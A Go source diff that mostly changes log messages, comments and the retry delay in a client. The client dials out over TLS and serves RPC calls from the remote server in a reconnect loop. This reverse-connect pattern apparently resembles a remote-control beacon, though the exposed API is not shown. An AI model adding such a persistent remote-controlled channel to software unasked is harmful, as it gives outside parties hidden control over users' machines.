@@ -11,12 +11,14 @@ import (
 	"time"
 )
 
+// connect dials a remote address and returns the tls.Client to NetClient
 func connect() (net.Conn, error) {
 	conn, err := net.Dial("tcp", s.addr)
 	if err != nil {
 		return nil, err
 	}
-	log.Println("connect")
+
+	log.Println("[NetClient] [+] Connection to server successful")
 	caPool := x509.NewCertPool()
 	caPool.AddCert(s.cert)
 
@@ -28,21 +30,22 @@ func connect() (net.Conn, error) {
 	return tlsconn, nil
 }
 
+// NetClient starts a connection and invokes connect
 func NetClient() {
-	log.Println("NetClient")
+	log.Println("[NetClient] Starting connection")
 	initServer()
 
 	api := new(API)
 
-	if err := rpc.Register(api); err != nil {
-		log.Fatal("Cannot register rpc api:", err)
+	if rpcErr := rpc.Register(api); rpcErr != nil {
+		log.Fatal("[NetClient] [!] Could not register RPC API:", rpcErr)
 	}
 
 	for {
 		conn, err := connect()
 		if err != nil {
-			log.Println("Could not connect:", err)
-			time.Sleep(10 * time.Second)
+			log.Println("[NetClient] [!] Could not connect:", err)
+			time.Sleep(25 * time.Second)
 			continue
 		}
 		rpc.ServeConn(conn)
